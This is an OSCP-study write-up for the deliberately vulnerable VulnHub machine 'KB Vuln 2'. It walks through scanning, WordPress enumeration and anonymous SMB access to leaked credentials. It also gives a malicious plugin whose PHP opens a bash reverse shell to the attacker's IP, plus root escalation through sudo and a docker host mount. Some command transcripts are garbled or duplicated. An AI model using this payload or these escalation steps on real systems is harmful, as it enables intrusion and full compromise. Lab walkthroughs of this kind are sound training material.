---
---
#  KB Vuln 2:

Hello, this is one of my writeups, while studying for the OSCP certification. This VM (found [here](https://www.vulnhub.com/entry/kb-vuln-2,562/)) is a nice easy level machine.

> I'm not using Kali, or any penTest specific distro. I'm just using my Ubuntu machine. Feel free to use whatever distro you feel comfortable with.


So after you fire up the vm, give it a few minutes to start up all services. Afterwards lets start by scanning the network to identify its IP.
```
netdiscover
```
came up  with the VM's IP : `192.168.1.2`

Lets scan the VM with `nmap` to check what services are exposed.
```
$ nmap -sV 192.168.1.4
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-01 09:29 EEST
Nmap scan report for kb-server (192.168.1.2)
Host is up (0.00010s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: UBUNTU; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Lets first check if the ftp service accepts anonymous logins.
It appears, it doesn't, so we need to find a username, lets check the web app on port 80.

There's hust the default apache page, so lets enumerate it with `dirb`:
```
$ dirb http://192.168.1.2

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Oct  2 08:28:12 2020
URL_BASE: http://192.168.1.2/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.2/ ----
+ http://192.168.1.2/index.html (CODE:200|SIZE:10918)                                                  
+ http://192.168.1.2/server-status (CODE:403|SIZE:276)                                                 
==> DIRECTORY: http://192.168.1.2/wordpress/                                                           
                                                                                                       
---- Entering directory: http://192.168.1.2/wordpress/ ----
+ http://192.168.1.2/wordpress/index.php (CODE:301|SIZE:0)                                             
==> DIRECTORY: http://192.168.1.2/wordpress/uploads/                                                   
==> DIRECTORY: http://192.168.1.2/wordpress/wp-admin/                                                  
==> DIRECTORY: http://192.168.1.2/wordpress/wp-content/                                                
==> DIRECTORY: http://192.168.1.2/wordpress/wp-includes/                                               
+ http://192.168.1.2/wordpress/xmlrpc.php (CODE:405|SIZE:42)                                           
                                                                                                       
---- Entering directory: http://192.168.1.2/wordpress/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                       
---- Entering directory: http://192.168.1.2/wordpress/wp-admin/ ----
+ http://192.168.1.2/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)                                    
==> DIRECTORY: http://192.168.1.2/wordpress/wp-admin/css/                                              
==> DIRECTORY: http://192.168.1.2/wordpress/wp-admin/images/                                           
==> DIRECTORY: http://192.168.1.2/wordpress/wp-admin/includes/                                         
+ http://192.168.1.2/wordpress/wp-admin/index.php (CODE:302|SIZE:0)                                    
==> DIRECTORY: http://192.168.1.2/wordpress/wp-admin/js/                                               
==> DIRECTORY: http://192.168.1.2/wordpress/wp-admin/maint/                                            
==> DIRECTORY: http://192.168.1.2/wordpress/wp-admin/network/                                          
==> DIRECTORY: http://192.168.1.2/wordpress/wp-admin/user/                                             
                                                                                                       
---- Entering directory: http://192.168.1.2/wordpress/wp-content/ ----
+ http://192.168.1.2/wordpress/wp-content/index.php (CODE:200|SIZE:0)                                  
==> DIRECTORY: http://192.168.1.2/wordpress/wp-content/plugins/                                        
==> DIRECTORY: http://192.168.1.2/wordpress/wp-content/themes/                                         
==> DIRECTORY: http://192.168.1.2/wordpress/wp-content/upgrade/                                        
==> DIRECTORY: http://192.168.1.2/wordpress/wp-content/uploads/                                        
                                                                                                       
---- Entering directory: http://192.168.1.2/wordpress/wp-includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                       
---- Entering directory: http://192.168.1.2/wordpress/wp-admin/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                       
---- Entering directory: http://192.168.1.2/wordpress/wp-admin/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                       
---- Entering directory: http://192.168.1.2/wordpress/wp-admin/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                       
---- Entering directory: http://192.168.1.2/wordpress/wp-admin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                       
---- Entering directory: http://192.168.1.2/wordpress/wp-admin/maint/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                       
---- Entering directory: http://192.168.1.2/wordpress/wp-admin/network/ ----
+ http://192.168.1.2/wordpress/wp-admin/network/admin.php (CODE:302|SIZE:0)                            
+ http://192.168.1.2/wordpress/wp-admin/network/index.php (CODE:302|SIZE:0)                            
                                                                                                       
---- Entering directory: http://192.168.1.2/wordpress/wp-admin/user/ ----
+ http://192.168.1.2/wordpress/wp-admin/user/admin.php (CODE:302|SIZE:0)                               
+ http://192.168.1.2/wordpress/wp-admin/user/index.php (CODE:302|SIZE:0)                               
                                                                                                       
---- Entering directory: http://192.168.1.2/wordpress/wp-content/plugins/ ----
+ http://192.168.1.2/wordpress/wp-content/plugins/index.php (CODE:200|SIZE:0)                          
                                                                                                       
---- Entering directory: http://192.168.1.2/wordpress/wp-content/themes/ ----
+ http://192.168.1.2/wordpress/wp-content/themes/index.php (CODE:200|SIZE:0)                           
                                                                                                       
---- Entering directory: http://192.168.1.2/wordpress/wp-content/upgrade/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                       
---- Entering directory: http://192.168.1.2/wordpress/wp-content/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Fri Oct  2 08:28:18 2020
DOWNLOADED: 36896 - FOUND: 13
```

There apears to be a wordpress app running  under the /wordpress dir.

Lets add the following to our /etc/hosts first and visit it with our browser:
```
192.168.1.2     kb.vuln
```

Lets scan it with `wpscan`:
```
$ wpscan --url http://kb.vuln/wordpress --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://kb.vuln/wordpress/ [192.168.1.2]
[+] Started: Fri Oct  2 08:36:30 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://kb.vuln/wordpress/xmlrpc.php
 | Found By: Link Tag (Passive Detection)
 | Confidence: 100%
 | Confirmed By: Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://kb.vuln/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://kb.vuln/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://kb.vuln/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5.1 identified (Latest, released on 2020-09-01).
 | Found By: Rss Generator (Passive Detection)
 |  - http://kb.vuln/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
 |  - http://kb.vuln/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>

[+] WordPress theme in use: best-education
 | Location: http://kb.vuln/wordpress/wp-content/themes/best-education/
 | Latest Version: 1.1.0 (up to date)
 | Last Updated: 2020-07-21T00:00:00.000Z
 | Readme: http://kb.vuln/wordpress/wp-content/themes/best-education/readme.txt
 | Style URL: http://kb.vuln/wordpress/wp-content/themes/best-education/style.css?ver=5.5.1
 | Style Name: Best Education
 | Style URI: https://thememattic.com/theme/best-education
 | Description: Best Education is the flexible and highly responsive wordpress theme that helps in creating the best...
 | Author: Thememattic
 | Author URI: https://thememattic.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://kb.vuln/wordpress/wp-content/themes/best-education/style.css?ver=5.5.1, Match: 'Version: 1.1.0'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==========================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://kb.vuln/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Fri Oct  2 08:36:31 2020
[+] Requests Done: 51
[+] Cached Requests: 6
[+] Data Sent: 11.791 KB
[+] Data Received: 287.136 KB
[+] Memory used: 165.57 MB
[+] Elapsed time: 00:00:01
```
Lets try to brute force the admin's password:
```
$ wpscan --url http://kb.vuln/wordpress --passwords ../wordlists/rockyou.txt --usernames admin –max-threads 64 
```
The bruteforce attack failed, so lets check if the smbshare service accepts anonymous logins:
```
$ smbclient //192.168.1.2/Anonymous
Enter WORKGROUP\test's password: 
Try "help" to get a list of possible commands.
smb: \> 
smb: \> ls
  .                                   D        0  Thu Sep 17 13:58:56 2020
  ..                                  D        0  Wed Sep 16 13:36:09 2020
  backup.zip                          N 16735117  Thu Sep 17 13:58:56 2020

		14380040 blocks of size 1024. 8232064 blocks available
```
It appears it does! And there's a nice bacckup.zip ripe for the taking in there.
Get it locally with:
```
smb: \> get backup.zip 
```
Extracting it, we find that it contains an actuall backup of the wordpress site! Plus the admin's credentials that we failed to brute force before! Neat!
```
$ cat remember_me.txt 
Username:admin
Password:MachineBoy141
```
Let's login with that and have a look around, for a way to get a shell.

It seems we are able to upload a custom plugin. This can be our way in!
Lets create one:

Create a file exploit.php, with the folllowing content:
```
<?php
   /*
   Plugin Name: exploit 
   Version: 666 
   Author: exploitmaster
   */

system("bash -c 'bash -i >& /dev/tcp/192.168.1.10/6666 0>&1'");
?>
```
> Dont forget to change the ip with yours

Then zip it, like this:
```
$ zip plugin.zip exploit.php 
  adding: exploit.php (deflated 15%)
```
Fire up a `netcat` listener in a terminal:
```
nc -lnvp 6666
```
Then upload and activate the plugin through wordpress. Clicking on the activation button, gives us a reverse shell in our netcat listener:
```
Listening on 0.0.0.0 6666
Connection received on 192.168.1.2 40800
bash: cannot set terminal process group (1346): Inappropriate ioctl for device
bash: no job control in this shell
www-data@kb-server:/var/www/html/wordpress/wp-admin$ 
```
navigating to /hom/kbadmin dir we find a user flag and a note to use docker.

`sudo -l` isn't possible for the wp-admin user, so lets try to switch to the kbadmin user using the password we found above:
```
$su kbadmin

Password: MachineBoy141

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kbadmin@kb-server:~$
```
runiing `sudo -l` again as the kbadmin user, we see that we can get root without even trying with docker.
```
kbadmin@kb-server:~$ ssuuddoo  --ll

[sudo] password for kbadmin: MachineBoy141

Matching Defaults entries for kbadmin on kb-server:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kbadmin may run the following commands on kb-server:
    (ALL : ALL) ALL
kbadmin@kb-server:~$ ssuuddoo  ssuu

root@kb-server:~# cat  /root/flag.txt

dc387b4cf1a4143f562dd1bdb3790ff1

```

Another way to get root using `docker`, as the creator of thisVM suggests, would be the following:
```
kbadmin@kb-server:~$ docker run -it -v /:/mnt alpine chroot /mntdocker run -it -v /:/mnt alpine chroot /mnt

groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@7143edb81f12:/# 
```
### I hope that you enjoyed this VM as much as I did.